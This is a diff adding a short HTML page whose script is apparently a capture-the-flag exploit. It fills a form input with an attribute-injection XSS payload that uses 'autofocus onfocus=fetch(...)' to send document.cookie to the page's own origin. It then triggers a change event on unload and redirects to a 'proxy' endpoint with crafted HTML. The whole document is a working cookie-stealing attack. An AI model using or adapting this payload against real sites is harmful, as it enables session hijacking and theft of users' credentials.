@@ -1,0 +1,19 @@
+<body>
+    <form>
+        <input type="text" name="myinput">
+        <input type="submit">
+    </form>
+    <script>
+        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+        setTimeout(async () => {
+            const inp = document.querySelector('input');
+            inp.value = `shikanoko nokonoko koshitantan $\` autofocus onfocus=fetch(\`${origin}?\`+document.cookie) x=`;
+            window.onbeforeunload = async () => {
+                await sleep(5);
+                inp.dispatchEvent(new Event('change'));
+            };
+            await sleep(1000);
+            location.href = "http://proxy?html=" + encodeURIComponent(`<input name="myinput" value="">`)
+        }, 15);
+    </script>
+</body>
